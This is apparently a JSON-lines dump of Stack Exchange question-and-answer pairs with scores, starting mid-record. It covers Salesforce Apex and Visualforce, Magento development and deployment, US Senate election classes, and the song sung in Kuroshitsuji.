correctedDateTime);\n// In the users Pacific/Auckland timezone the time should be moved forward 21 hours\nSystem.assertEquals(correctedDateTime, DateTime.valueofGmt('2013-02-18 14:35:00'));\n\nThings might get a bit tricky around transitions to and from daylight savings in various regions. TimeZone.getOffset() will correct for this, but it would be worth creating some test cases for the boundary conditions.\n Source xkcd\n", "question_score": "9", "answer_score": 13}
{"title": "Parameterized Interfaces - what are they?", "description": "This is purely for academic purpose to understand how interfaces work\nI found many examples where you pass something while implementing an interface\n global class CustomIterable \n       implements Iterator<Account>\n\nglobal class CleanUpRecords implements Database.Batchable<sObject> \n\nwhat exactly does <account> and <sobject> stand here for?\nCan someone post a custom interface sample code which requires such a parameter to be passed(so that its more clear)\n", "answer": "Parametrised interfaces were removed in Winter '13 (Release Notes, page 191), and you cannot create them in code saved with API version 26 or above. However they are still used by a number of internal Salesforce interfaces, such as Database.Batchable.\nParametrised interfaces (and classes) are common in other OO-languages such as C# and Java, where they are referred to as generics and are much more flexible (C# documentation, Java documentation).\nThere is still some old database.com documentation available which explains how to create and use them.\n\nParameterized Typing and Interfaces\nParameterized typing allows interfaces to be implemented with generic data type parameters that are replaced with actual data types upon construction.\nThe following gives an example of how the syntax of a parameterized interface works. In this example, the interface Pair has two type variables, T and U. A type variable can be used like a regular type in the body of the interface.\n public virtual interface Pair<T, U> {\n      T getFirst();\n      U getSecond();\n      void setFirst(T val);\n      void setSecond(U val);\n      Pair<U, T> swap();\n }\n\nThe following interface DoubleUp extends the Pair interface. It uses the type variable T:\npublic interface DoubleUp<T> extends Pair<T, T> {}\n\nImplementing Parameterized Interfaces\nA class that implements a parameterized interface must pass data types in as arguments to the interface's type parameters.\npublic class StringPair implements DoubleUp<String> {\n    private String s1;\n    private String s2;\n\n   public StringPair(String s1, String s2) {\n        this.s1 = s1;\n        this.s2 = s2;\n    }\n\n   public String getFirst() { return this.s1; }\n   public String getSecond() { return this.s2; }\n\n   public void setFirst(String val) { this.s1 = val; }\n   public void setSecond(String val) { this.s2 = val; }\n\n   public Pair<String, String> swap() {\n        return new StringPair(this.s2, this.s1);\n    }\n}\n\n", "question_score": "9", "answer_score": 15}
{"title": "Custom Fonts in Visualforce Page (renderas=\"pdf\")", "description": "Trying to use a custom font in my visualforce page (rendered as pdf). I have looked at many conflicting articles saying that the only option are the \"limited\" fonts supported, whereas others say that you can add the css as a static resource and reference (https://developer.salesforce.com/forums?id=906F000000096dcIAA   bottom comment). \nDoes anyone know if this is possible/had success with custom fonts before? \n", "answer": "The current v31.0 \"official\" line is that there is a limited set of fonts available.\n\nFonts Available When Using Visualforce PDF Rendering\n\nVisualforce PDF rendering supports a limited set of fonts. Use the following font names to ensure that PDF output renders as you expect.\nThe fonts available when you’re rendering a page as a PDF are as follows. The first listed font-family value for each typeface is the recommended choice.\n\nTypeface\nStyle font-family Value to Use (Font Synonyms)\n\nArial Unicode MS\nArial Unicode MS\nHelvetica\nsans-serif\nSansSerif\nDialog\nTimes\nserif\nTimes\nCourier\nmonospace\nCourier\nMonospaced\nDialogInput\n\nNote\n\nThese rules apply to server-side PDF rendering. You might see different results when viewing pages in a web browser.\nText styled with any value besides those listed above receives the default font style, Times. This means that, ironically, while Helvetica’s synonyms render as Helvetica, using “Helvetica” for the font-family style renders as Times. We recommend using “sans-serif”.\nArial Unicode MS is the only multibyte font available, providing support for the extended character sets of languages that don’t use the Latin character set.\n\nSource - Fonts Available When Using Visualforce PDF Rendering\nNote also that there is talk of a new and improved PDF rendering engine in the works. This may give you better font options, but is only in closed pilot last time I checked.\n", "question_score": "9", "answer_score": 13}
{"title": "My Header and Footer overlaps with the content in a PDF Visualforce Page", "description": "I am trying to render my PDF page with a header and a footer, that are actually images, and a content, that expands in more than one page. \nThe problems that I am facing are:\n\nThe Header gets rendered properly but appears as a background image, while the content starts displaying since at the beginning of the page.\nThe footer, can be seen only 30 %, while the other part of the footer, doesn't get shown. \nThe footer doesn't get wrapped in a dotted rectangle(but this is a minor issue).\nTo develop this page, I've been refering to this post and I've tried to adapt it. \n\nThe CSS Style used is the following(dynaPdf): \n\n@page {\n    @top-center {\n        content: element(header);\n    }\n\n    @bottom-left {\n        content: element(footer);\n    }\n}\n\ndiv.header {\n    padding: 10px;\n    position: running(header);\n}\n\ndiv.footer {\n    display: block;\n    padding: 5px;\n    position: running(footer);\n}\n\n.pagenumber:before {\n    content: counter(page);\n}\n\n.pagecount:before {\n    content: counter(pages);\n}\n\nThe component used to visualize a header or footer is as follows(DynaPdfComponent):\n\n<apex:component >\n<apex:attribute required=\"true\"  type=\"string\" name=\"type\" description=\"specify header and footer type\" />\n\n<apex:stylesheet value=\"{!$Resource.dynaPdf}\"/>\n\n<div class=\"{!type}\">\n    <apex:componentBody />\n</div>      \n\nThe visualforce page used for the test purpose, is:\n\n<apex:page standardStylesheets=\"false\" id=\"pge\" renderAs=\"pdf\" controller=\"DynaPdfPageCTRL\">\n\n<head>\n    <style>\n        div.content {\n            border-style:dotted;\n            float: left;\n            width: 100%;\n            margin-top:10cm;\n            margin-bottom:10cm;\n        }\n    </style>\n</head>\n\n<!-- HEADER -->\n<c:dynaPdfComponent type=\"header\" > \n\n  <apex:image value=\"{!$Resource.Header_Test_ES}\" height=\"100%\" width=\"100%\"/>\n\n</c:dynaPdfComponent>\n\n<!-- FOOTER -->\n<c:dynaPdfComponent type=\"footer\">\n\n    <div>Page <span class=\"pagenumber\"/> of <span class=\"pagecount\"/></div>\n    <apex:image value=\"{!$Resource.Footer_Test_ES}\" width=\"100%\" height=\"100%\" />\n\n</c:dynaPdfComponent>\n\n<!-- CONTENT -->\n<div class=\"content\">\n    <apex:repeat value=\"{!testStringList}\" var=\"s\">                    \n        <b>{!s}</b>\n        <br/>\n    </apex:repeat>  \n</div>\n\nThe controller used to generate a sample list of strings (DynaPdfPageCTRL), is:\n\npublic class DynaPdfPageCTRL {\n    public List<String> testStringList {\n        get {\n            List<String> result = new List<String>();\n            for (Integer i = 1; i < 250; i++ ) {\n                result.add('TEST CONTENT ' + i);\n            }\n            return result;\n        } set;\n    } \n\n    public DynaPdfPageCTRL() { }\n}\n\nAlong with this post, I am attaching also:\na) The view of the rendered page: \nb) The header image: \nc) The footer image: \nThank you so much guys.\nGreetings,\nEndrit.\n", "answer": "I think the main issues is that you should put your margin measurements in the @page element and remove them from the content div. For readability, i've put this all in one VF page:\n<apex:page standardStylesheets=\"false\" id=\"pge\" renderAs=\"pdf\" controller=\"DynaPdfPageCTRL\" applyHtmlTag=\"false\" showHeader=\"false\" >\n<head>\n    <style>\n        @page {\n            margin-top: 4cm;\n            margin-bottom: 3cm;\n\n            @top-center {\n                content: element(header);\n            }\n            @bottom-left {\n                content: element(footer);\n            }\n        }\n\n        div.header {\n            padding: 10px;\n            position: running(header);\n        }\n        div.footer {\n            display: block;\n            padding: 5px;\n            position: running(footer);\n        }\n        .pagenumber:before {\n            content: counter(page);\n        }\n        .pagecount:before {\n            content: counter(pages);\n        }\n        div.content {\n            border-style:dotted;\n            float: left;\n            width: 100%;\n        }\n    </style>\n</head>\n\n<!-- HEADER -->\n<div class=\"header\">\n    <apex:image value=\"{!$Resource.Header_Test_ES}\" height=\"100%\" width=\"100%\"/>\n</div>\n\n<!-- FOOTER -->\n<div class=\"footer\">\n    <div>Page <span class=\"pagenumber\"/> of <span class=\"pagecount\"/></div>\n    <apex:image value=\"{!$Resource.Footer_Test_ES}\" width=\"100%\" height=\"100%\" />\n</div>\n\n<!-- CONTENT -->\n<div class=\"content\">\n    <apex:repeat value=\"{!testStringList}\" var=\"s\">                    \n        <b>{!s}</b>\n        <br/>\n    </apex:repeat>  \n</div>\n</apex:page>\n\nNotice I also had to add the following attributes to the  element applyHtmlTag=\"false\" showHeader=\"false\" \n\n", "question_score": "9", "answer_score": 14}
{"title": "Getting a birthday workflow to work", "description": "I am looking to run a workflow off a birthdate and notify my user that this birthday is coming up in 10 days. I am using this formula:\n(MONTH( Birthdate)) = MONTH(TODAY()) && (DAY( Birthdate)) = DAY(TODAY()-10)\n\nAnd I can not get the workflow to work and fire off the email. Also can I use this on a static field that is not being updated? \nThanks for the help!\n", "answer": "\nCreate a \"Birthday Notification Date\" field.\nCreate a Workflow with a Workflow Field Update that checks for an entered birthday and updates the Birthday Notification Date field with the correct value.\nCreate a Time Based Workflow rule that fires on the Birthday Notification Date field, sends the email, and clears the field.\n\nMake sure that \"recursive mode\" is enabled for both workflows.\n\nHow it works:\n\nUser creates or updates a contact with a birthday.\nThe notification field is populated from Workflow Rule #1.\nThe update from the previous step recursively calls Workflow Rule #2 to lock the notification into the Time Based Workflow queue.\nThe user is notified when Workflow Rule #2 performs its delayed actions.\nThe field update from Workflow Rule #2 will recursively call Workflow #1, updating the notification date for the next year.\nThe cycle repeats from step 2.\n\nThe appropriate formula for the notification update value would be:\nDATE(\nYEAR(TODAY())+\nIF(\n    DATE(YEAR(TODAY()), MONTH(BirthDate), DAY(BirthDate))-10<TODAY(),1,0), \nMONTH(BirthDate), \nDAY(BirthDate))-10\n\nAlso, it should be noted that you'll have to perform an update on all contacts at least once (batch update) to queue the notifications.\nEdit Updated formula after sanity check.\nEdit Does not include February 29th individuals. If that's a concern, one additional check would be needed to bump the date back a day for non-leap years.\n", "question_score": "9", "answer_score": 11}
{"title": "Convert a binary value to an decimal value", "description": "I would like to know if there is a method to convert a binary value to a decimal value?\nFor example, I need to convert the binary 10000101111010 and get the result 8570.\n", "answer": "Converting to an Integer or Long value is fairly trivial:\npublic static Integer binaryToInteger(String value) {\n    Integer result;\n    if(value != null && value.containsOnly('01')) {\n        result = 0;\n        for(String s: value.split('')) {\n            result = (result << 1) | (s == '1'? 1: 0);\n        }\n    }\n    return result;\n}\n\n(You can replace Integer above with Long to get more bit storage).\nYou can also cast the result to a Decimal, but it will still only be a whole number. If you want to include proper decimal values, on the other hand, you'll have to parse IEEE 754 bits, which is a little more complicated than a simple shift/or loop.\n\nBasically, this method first creates a buffer of all binary 0 values. For each bit in the string, it shifts all the bits left 1 (<< 1), and then binary ORs (|) the latest bit into position. Basically, we're reading the string from left to right to build the number in decimal notation.\nN.B. Older versions of the API included a blank space in the first array index when you split an empty string. I've adjusted this code (after thinking about it) so that a blank string is also interpreted as a 0 bit, so this code should work in any class regardless of API version.\n", "question_score": "9", "answer_score": 12}
{"title": "How did US Senate classes get so unbalanced?", "description": "The next election for US Senators in 2018 has 8 GOP seats and 25 Democratic seats (including 2 indies that caucus with the Dems).  (For the curious:  ten of the Democratic seats are in states that Trump won.)\nQuestion: while I know this happens on occasion, is this party-heavy extreme normal in Senate cycles?  Is there a trend here?  And are there any reasons why this unbalancing occurred or is likely to continue? \n", "answer": "A commenter suggests\n\nIt's simply an artifact of Democratic success in 2012\n\nThis is not true.  The Senate class of 2012 was already unbalanced as a result of the pro-Democrat, anti-Republican race of 2006 and the somewhat balanced race of 2000.  Prior to 2012, the ratio was twenty-three Democrats to ten Republicans.  After, twenty-five to eight (including Angus King and Bernie Sanders who ran as independents in 2012), a gain of two.  \nThe 2010 class was a good year for Republicans with a net gain of six seats over 2004.  The 2016 class took the balance back by two seats.  Currently twenty-two Republicans to eleven Democrats.  \nThe 2014 class also produced a major shift, as it followed the good Democrat class of 2008.  Currently twenty-two Republicans to eleven Democrats.  \nAs you can see, while the 2012 class is the most unbalanced, every current Senate class is unbalanced.  \n     Rep Dem    Net Rep\n1994  19  14      + 5\n1996  21  12      + 9\n1998  16  18      - 2\n2000  14  19      - 4\n2002  21  12      + 9\n2004  19  15      + 4\n2006   9  24      -15\n2008  13  20      - 7\n2010  24  10      +14\n2012   8  25      -17\n2014  22  11      +11\n2016  22  12      +10\n\nNote that these are the results of only that election class.  If special elections were held for other election classes, their results were not included.  Dem results include independents who caucus with the Democrats.  Rep is just Republicans.  \nThere are some competing causes here.  Republicans tend to do better in midterms than presidential elections.  Both parties tend to do better when they have a presidential candidate winning.  Both parties do better in midterms when the other party has the presidency.  In the period from 1998 to 2004, most of the Senate results were balanced.  \nIn 2006, there was an unpopular Republican president and it was a midterm election.  Two out of three advantages to the Democrats from a balanced start.  Democrats were down one seat and gained six (including two independents, Bernie Sanders and Joe Lieberman).  In 2012, Democrats gained additional seats in a presidential year where their candidate won.  \nIn each of 2010 and 2014, there was a Democratic president and a midterm.  All advantages to the Republicans.  They started up by two seats and added six in 2010.  They started down by seven and gained nine in 2014.  \nThings could go either way in 2018.  It is the most unbalanced Senate class, which would tend to favor the Republicans.  And it's a midterm: mild benefit for Republicans.  But there will also be a president who ran as a Republican, generally an advantage for Democrats.  Ten Democrats up for election in 2018 are in states that Donald Trump won in 2016.  Only Dean Heller of Nevada is a Republican from a state that Hillary Clinton won.  Jeff Flake from Arizona and Ted Cruz from Texas are Republicans from states where Clinton did better than expected.  Cruz may struggle with Republicans after 2016.  \nPrior to 2012, most prognosticators expected Republican gains since the Democrats had few opportunities.  But Democrats made gains.  Maybe they'll do so again.  Maybe not.  Best guess might be that Democrats will lose a few seats to Republicans but end up with a smaller lead.  But it's possible that they might gain seats or lose enough to lose the lead in this class.  Republicans need eight for a supermajority of sixty seats.  \nA three seat gain for the Democrats (Heller, Flake, and Cruz) is possible but unlikely.  An eleven seat gain for Republicans is possible but still unlikely (e.g. states they won in 2016 plus Minnesota where they almost won).  More likely results are a one seat gain for Democrats (e.g. Heller), a two seat gain for Republicans (e.g. lose Heller but gain the seats of Claire McCaskill of Missouri, Jon Tester of Montana, and Joe Donnelly of Indiana; three Democrats known for the weakness of their 2012 Republican opponents), or a nine seat gain (e.g. every state votes for Senator as it voted for president in 2016).  And of course everything in between.  \n", "question_score": "9", "answer_score": 11}
{"title": "What is the song that Drocell sings?", "description": "In Kuroshitsuji, they often sing a song that ends on \"my fair lady,\" see here.\nIt sounded really familiar to a song that I've heard before in several other languages, but I can't find the name or the origin of this song. \nWhat is the name of this song?\n", "answer": "That song is the nursery rhyme \"London Bridge is Falling Down,\" or simply \"My Fair Lady.\"\nThis version that is sung seems to be a variation on the one quoted by Iona and Peter Opie in 1951.\n\nLondon ba shi o chi ru, o chi ru, o chi ru\n  London ba shi o chi ru, My Fair Lady\n  (London Bridge is falling down / Falling down, Falling down. / London Bridge is falling down / My fair lady.)  \nTetsu to hagane de tsukure, tsukure, tsukure.\n  Tetsu to hagane de tsukure, My Fair Lady\n  (Build it up with iron and steel, / Iron and steel, iron and steel, / Build it up with iron and steel, / My fair lady.)  \nTetsu to hagane ja magaru, magaru, magaru.\n  Tetsu to hagane ja magaru, My Fair Lady\n  (Iron and steel will bend and bow, / Bend and bow, bend and bow, / Iron and steel will bend and bow, / My fair lady.)  \nKin to gin de tsukure, tsukure, tsukure.\n  Kin to gin de tsukure, My Fair Lady\n  (Build it up with silver and gold, / Silver and gold, silver and gold, / Build it up with silver and gold, / My fair lady.)  \nKin to gin ja nusumareru, nusumareru, nusumareru.\n  Kin to gin ja nusumareru, My Fair Lady\n  (Silver and gold will be stolen away, / Stolen away, stolen away, / Silver and gold will be stolen away, / My fair lady.)  \nRou to ishi de tsukure, tsukure, tsukure.\n  Rou to ishi de tsukure, My Fair Lady.\n  (Build it up with bricks and mortar, / Bricks and mortar, bricks and mortar, / Build it up with bricks and mortar, / My fair lady.)  \nRou to ishi ja kuchihateru, kuchihateru, kuchihateru.\n  Rou to ishi ja kuchihateru, My Fair Lady.\n  (Bricks and mortar will not stay, / Will not stay, will not stay, / Bricks and mortar will not stay, / My fair lady.)  \n\n", "question_score": "9", "answer_score": 10}
{"title": "GIT and deployment strategy Magento2 projects", "description": "With Magento 1 I used a deploy tool that pulled in the GIT repo, ran commands like modman deploy-all and made sure the var directory was writable. For the .gitignore I used this one which worked pretty well. \nBut what about Magento 2? \nWhat gitignore works best, how do you deploy your project and what command should one run pre- and post deploy. Looking forward to hearing some insights from the community.\nQuestion will stay open for quite some time\n", "answer": "Steps below describe how to set up environment for custom module development, not for production.\nProject initialization\n\nAdd repo.magento.com credentials and github access token to auth.json in composer home directory\n\nCreate project using the following command:\ncomposer create-project --repository-url=https://repo.magento.com/ magento/project-community-edition .\n\nTake this .gitignore and put into your project root. Almost all core files/directories are already added to the root .gitignore, but it is better to add the following 2 as well /update and /phpserver (just add these 2 lines to .gitignore)\n\nInitialize new git repository in the project root\n\nAdd all untracked files to git and commit them\n\nStart development of your modules as usual (put them under app/code/VendorName/ModuleName), now you will have only your custom code in your git repository\n\nMagento installation\n\nMake sure all filesystem permissions are set as outlined in the official guide\n\nInstall Magento using command line, e.g.:\n${project_root}/bin/magento setup:install \\ --db-host=localhost \\ --db-name=magento \\ --db-user=root \\ --backend-frontname=admin \\ --base-url=http://base.url.goes.here/ \\ --language=en_US \\ --timezone=America/Chicago \\ --currency=USD \\ --admin-lastname=Admin \\ --admin-firstname=Admin \\ --admin-email=admin@example.com \\ --admin-user=admin \\ --admin-password=123123q \\ --cleanup-database \\ --use-rewrites=1\n\nEnable indexers cron job, e.g. on Ubuntu:\necho \"* * * * * php ${project_root}/bin/magento cron:run &\" | crontab -u www-data -\n\nMagento will run in default mode and all missing content will be auto-generated upon first request. So no need to run compiler or static content deploy\n\n[optional] If using PHP Storm, run the following command in  to enable XSD support:\nbin/magento dev:urn-catalog:generate .idea/misc.xml\n\n", "question_score": "96", "answer_score": 61}
{"title": "How to create a Custom Indexer?", "description": "I'm trying to create a custom indexer for a particular product attribute.\nI need to:  \n\nread the product attribute value \nprocess it in some way ( not relevant )\nsave it in a index table\n\nThe above steps could be implemented in a custom script but I would like integrate the indexer using the patter used by other indexer in Magento.\nI can see that Magento default indexer implement this abstract class Mage_Index_Model_Indexer_Abstract\n... It looks not easy to understand the process from the code and I cannot find any documentation for it.\nAny help is appreciate thanks.\n", "answer": "Following info should be a generic guide line that lead to a basic understanding of the whole indexer thing, so are not a complete 'walkthrough' ... ( if you want to contribute to this answer you are welcome )\nThere are at least 3 steps required here:\n\nCreate an index table and related resource model\nCreate an Indexer model that implement Mage_Index_Model_Indexer_Abstract\nadd your indexer to Magento configuration\n\nSuggested documentation:  \n\nProbably the best way to dig into this is to give a look at Mage_Catalog_Model_Product_Indexer_Price ( this is one of the easier index implementation ).\nThis resource, at the moment, looks the best guide to understand the whole process to decide what it is the action that is required.\n\nSTEP 1\nJust add your index table in the installer, as for any other module table.\nYour resource model needs to implement the logic for Reindex All in the reindexAll() method: you would probably process all entities here an extract all data.\nSTEP 2\n_registerEvent(),_processEvent() are the important method here, you will need to dig a bit in the below guide to understand the logic behind them\nBasically _registerEvent() add some data to the $event, on the base of the 'event type' and the 'entity type'. This extra data will be used in _processEvent() method. \nYou will need to implement at least the following methods in your model.\n/**\n * Data key for matching result to be saved in\n */\nconst EVENT_MATCH_RESULT_KEY = 'some_key';\n\n/**\n * Initialize resource model\n *\n */\nprotected function _construct()\n{\n    $this->_init('module/resource_model');\n}\n\n/**\n * @var  Used by matchEvent()\n * for example if you are processing products ...\n */\nprotected $_matchedEntities = array(\n    Mage_Catalog_Model_Product::ENTITY => array(\n        Mage_Index_Model_Event::TYPE_SAVE,\n        Mage_Index_Model_Event::TYPE_MASS_ACTION,\n        Mage_Index_Model_Event::TYPE_DELETE\n    )\n);\n\n /**\n * Get Indexer name\n *\n * @return string\n */\npublic function getName(){\n    return 'My indexer Name';\n}\n\n/**\n * Get Indexer description\n *\n * @return string\n */\npublic function getDescription()\n{\n    return 'My indexer Description';\n}\n\n/**\n * Register indexer required data inside event object\n *\n * @param   Mage_Index_Model_Event $event\n *\n * Register data required by process in event object\n * @param Mage_Index_Model_Event $event\n */\nprotected function _registerEvent(Mage_Index_Model_Event $event)\n{\n    $event->addNewData(self::EVENT_MATCH_RESULT_KEY, true);\n    $entity = $event->getEntity();\n    $dataObj = $event->getDataObject();\n\n    if ($entity == Mage_Catalog_Model_Product::ENTITY) {\n        if ($event->getType() == Mage_Index_Model_Event::TYPE_SAVE) {\n            $event->addNewData('yourmodule_update_product_id', $dataObj->getId());\n        } elseif ($event->getType() == Mage_Index_Model_Event::TYPE_DELETE) {\n            $event->addNewData(' yourmodule _delete_product_id', $dataObj->getId());\n        } elseif ($event->getType() == Mage_Index_Model_Event::TYPE_MASS_ACTION) {\n            $event->addNewData(' yourmodule _mass_action_product_ids', $dataObj->getProductIds());\n        }\n    }\n}\n\n/**\n * Process event based on event state data\n *\n * @param   Mage_Index_Model_Event $event\n */\nprotected function _processEvent(Mage_Index_Model_Event $event){\n    /** DO STUFF **/\n    return $this;\n}\n\nSTEP 3\nAdd this to your configuration, [module/model] is the model created in step 2.\nSo at this point if you go in system->indexer you will see a new entry  \n<global>\n    ......\n    <index>\n        <indexer>\n            <some_key>\n                <model>module/model</model>\n            </some_key>\n        </indexer>\n    </index>\n    ......\n</global> \n\nSources: \n\nhttp://www.mexbs.com/creating-custom-magento-index/ \nhttp://blog.magestore.com/2012/07/20/magento-certificate-custom-index/ \nhttp://www.slideshare.net/ivanchepurnyi/magento-indexes\n\n", "question_score": "9", "answer_score": 20}
{"title": "Flushing REDIS Cache", "description": "Will either of the buttons FLUSH REDIS?\n\n", "answer": "The \"Flush Magento Cache\" button will only flush out cache records based on their tags. This uses the Zend_Cache::CLEANING_MODE_MATCHING_ANY_TAG mode when calling clean on the cache backend.\nThe \"Flush Cache Storage\" button will flush the entire cache backing (where the backend supports it), using the Zend_Cache::CLEANING_MODE_ALL mode when calling clean on the cache backend.\nThe Cm_Cache_Backend_Redis does differentiate between the two modes and properly handles them both.\nWhat happens in Redis when the \"Cache Storage\" is flushed:\n1380734058.807909 [0 127.0.0.1:61926] \"flushdb\"\n\nWhat happens in Redis when the \"Magento Cache\" is flushed looks something like this...\n1380733999.123304 [0 127.0.0.1:61889] \"sunion\" \"zc:ti:541_MAGE\"\n1380733999.127239 [0 127.0.0.1:61889] \"multi\"\n1380733999.127294 [0 127.0.0.1:61889] \"del\" \"zc:k:541_APP_E4D52B98688947405EDE639E947EE03D\" \"zc:k:541_CORE_CACHE_OPTIONS\" ... etc ...\n1380733999.127493 [0 127.0.0.1:61889] \"del\" \"zc:ti:541_MAGE\"\n1380733999.127523 [0 127.0.0.1:61889] \"srem\" \"zc:tags\" \"541_MAGE\"\n1380733999.127547 [0 127.0.0.1:61889] \"exec\"\n1380733999.128596 [0 127.0.0.1:61889] \"sunion\" \"zc:ti:541_CONFIG\"\n1380733999.131160 [0 127.0.0.1:61889] \"multi\"\n1380733999.131192 [0 127.0.0.1:61889] \"del\" \"zc:k:541_CONFIG_GLOBAL_ADMIN\" \"zc:k:541_ENTERPRISE_LOGGING_CONFIG\" ... etc ...\n1380733999.131360 [0 127.0.0.1:61889] \"del\" \"zc:ti:541_CONFIG\"\n1380733999.131379 [0 127.0.0.1:61889] \"srem\" \"zc:tags\" \"541_CONFIG\"\n1380733999.131397 [0 127.0.0.1:61889] \"exec\"\n\nYou'll notice that in the first one a single command is processed by Redis vs the later example where two cache prefixes are used to delete all associated cache records. Based on what I'm seeing here (and in the code) both the '541_MAGE' and '541_CONFIG' prefixes are flushed in separate calls to the cache backend, with the config immediately following the other.\n", "question_score": "9", "answer_score": 12}
{"title": "Get Price of Configurable Product options", "description": "I need to export all products with prices from Magento 1.7.\nFor simple products this is no problem, but for configurable products I have this problem:\nThe price exported is the price set for the associated simple product!\nAs you know, Magento ignores this price and uses the price of the configurable product plus adjustments for the selected options.\nI can get the price of the parent product, but how do I calculate the difference depending on the selected options?\nMy code looks something like this:\nforeach($products as $p)\n   {\n    $price = $p->getPrice();\n            // I save it somewhere\n\n    // check if the item is sold in second shop\n    if (in_array($otherShopId, $p->getStoreIds()))\n     {\n      $otherConfProd = Mage::getModel('catalog/product')->setStoreId($otherShopId)->load($p->getId());\n      $otherPrice = $b2cConfProd->getPrice();\n      // I save it somewhere\n      unset($otherPrice);\n     }\n\n    if ($p->getTypeId() == \"configurable\"):\n      $_associatedProducts = $p->getTypeInstance()->getUsedProducts();\n      if (count($_associatedProducts))\n       {\n        foreach($_associatedProducts as $prod)\n         {\n                            $p->getPrice(); //WRONG PRICE!!\n                            // I save it somewhere\n                        $size $prod->getAttributeText('size');\n                        // I save it somewhere\n\n          if (in_array($otherShopId, $prod->getStoreIds()))\n           {\n            $otherProd = Mage::getModel('catalog/product')->setStoreId($otherShopId)->load($prod->getId());\n\n            $otherPrice = $otherProd->getPrice(); //WRONG PRICE!!\n                            // I save it somewhere\n            unset($otherPrice);\n            $otherProd->clearInstance();\n            unset($otherProd);\n           }\n         }\n                     if(isset($otherConfProd)) {\n                         $otherConfProd->clearInstance();\n                            unset($otherConfProd);\n                        }\n       }\n\n      unset($_associatedProducts);\n    endif;\n  }\n\n", "answer": "Here is how you can get the prices of the simple products. The example is for a single configurable product but you can integrate it in your loop.\nThere may be a problem with performance because there are a lot of foreach loops but at least you have a place to start. You can optimize later.  \n//the configurable product id\n$productId = 126; \n//load the product - this may not be needed if you get the product from a collection with the prices loaded.\n$product = Mage::getModel('catalog/product')->load($productId); \n//get all configurable attributes\n$attributes = $product->getTypeInstance(true)->getConfigurableAttributes($product);\n//array to keep the price differences for each attribute value\n$pricesByAttributeValues = array();\n//base price of the configurable product \n$basePrice = $product->getFinalPrice();\n//loop through the attributes and get the price adjustments specified in the configurable product admin page\nforeach ($attributes as $attribute){\n    $prices = $attribute->getPrices();\n    foreach ($prices as $price){\n        if ($price['is_percent']){ //if the price is specified in percents\n            $pricesByAttributeValues[$price['value_index']] = (float)$price['pricing_value'] * $basePrice / 100;\n        }\n        else { //if the price is absolute value\n            $pricesByAttributeValues[$price['value_index']] = (float)$price['pricing_value'];\n        }\n    }\n}\n\n//get all simple products\n$simple = $product->getTypeInstance()->getUsedProducts();\n//loop through the products\nforeach ($simple as $sProduct){\n    $totalPrice = $basePrice;\n    //loop through the configurable attributes\n    foreach ($attributes as $attribute){\n        //get the value for a specific attribute for a simple product\n        $value = $sProduct->getData($attribute->getProductAttribute()->getAttributeCode());\n        //add the price adjustment to the total price of the simple product\n        if (isset($pricesByAttributeValues[$value])){\n            $totalPrice += $pricesByAttributeValues[$value];\n        }\n    }\n    //in $totalPrice you should have now the price of the simple product\n    //do what you want/need with it\n}\n\nThe code above was tested on CE-1.7.0.2 with the Magento sample data for 1.6.0.0.\nI tested on the product Zolof The Rock And Roll Destroyer: LOL Cat T-shirt and it seams to work. I get as results the same prices as I see in the frontend after configuring the product by Size and Color\n", "question_score": "9", "answer_score": 13}
{"title": "How to disable Cash On Delivery on specific product type", "description": "Basically I need to disable cash on delivery on specific product type.\nBasically i m using store credit of mage store. This is for wallet in magento.\non payment option its showing cash on delivery . its a not a physical or virtual product. So i need to disable cash on delivery on this product type.\n", "answer": "You can do this by Magento Event/Observer\nFirst,using payment_method_is_active disable on depends current quote product type.\nCode for this:\nModule config.xml code:\n<global>\n    <events>\n    <payment_method_is_active>\n        <observers>\n            <paymentfilter_payment_method_is_active>\n            <type>singleton</type>\n            <class>yourmodel/observer</class>\n            <method>filterpaymentmethod</method>\n            </paymentfilter_payment_method_is_active>\n        </observers>\n    </payment_method_is_active>\n    </events>\n</global>\n\nObserver code is:\n\n<?php\n\nclass YOURNANESPACE_YOURMODULE_Model_Observer {\n\n    public function filterpaymentmethod(Varien_Event_Observer $observer) {\n        /* call get payment method */\n        $method = $observer->getEvent()->getMethodInstance();\n\n        /*   get  Quote  */\n        $quote = $observer->getEvent()->getQuote();\n\n        $result = $observer->getEvent()->getResult();\n        if (empty($quote) || (null === $quote)) {\n            return $this;\n        }\n\n        /* Disable Your payment method for   adminStore */\n        if ($method->getCode() == 'YOUR_PAYMENT_METHOD_CODE') {\n            foreach ($quote->getAllItems() as $item) {\n                // get Cart item product Type //\n                if ($item->getProductType() == 'YourProductType'):\n                    $result->isAvailable = false;\n                endif;\n            }\n        }\n    }\n\n}\n\n", "question_score": "9", "answer_score": 11}
{"title": "Is there any way to add JS/CSS to footer page?", "description": "I have a custom requirement to add a specific JS and CSS related to website's footer. Is there any way in Magento by which I can add it in footer section ?\n", "answer": "The footer block doesn't offer any support for js directly, like the head.\nBut there is a block with the name before_body_end where you can add everything you want with template or text block.\nI would think about your own template and the block type Mage_Page_Block_Html_Head, then you can use what @Dexter recommended.\nNo, you need something like this, you have no page/html_head block to refer too:\n<!-- get the block which we want our content in -->\n<reference name=\"before_body_end\">\n    <!-- add another block of type page/html_head to have all the great functionality to add/remove css and js stuff -->\n    <!-- it is important to set your own template, because the head block has a defined default template page/head.phtml which has all the stuff of the head. Using this will bring a lot of problems -->\n    <block type=\"page/html_head\" name=\"scripts_in_footer\" template=\"YOUR TEMPLATE\">\n        <!-- add whatever you want as you are used to in the head via the standard magento api -->\n        <action method=\"addItem\"><type>skin_css</type><name>css/styles.css</name></action>\n    </block>\n</reference>\n\nAnd inside of your template, you need:\n<?php // and to echo the whole stuff later in the template, you need to add the code, so the added js/Css files are echoed ?>\n<?php echo $this->getCssJsHtml() ?>\n<?php echo $this->getChildHtml() ?>\n\n", "question_score": "9", "answer_score": 17}
